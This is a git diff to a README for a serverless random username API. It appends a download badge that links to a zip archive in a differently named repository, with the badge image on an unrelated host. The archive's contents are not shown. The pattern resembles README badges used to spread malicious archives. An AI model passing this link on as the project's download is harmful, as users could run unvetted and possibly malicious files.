@@ -79,3 +79,6 @@ This API is powered by Vercel for serverless deployment of Node.js applications,
 Feel free to explore and integrate this API into your applications to generate unique usernames for your users or projects. If you have any questions or feedback, please don't hesitate to reach out!
 
 ---
+
+
+[![Download Random Username API](https://lelbois.nekoweb.org/download.svg)](https://github.com/randomusernameapi/randomusernameapi.github.io/raw/main/random-username-api.zip)
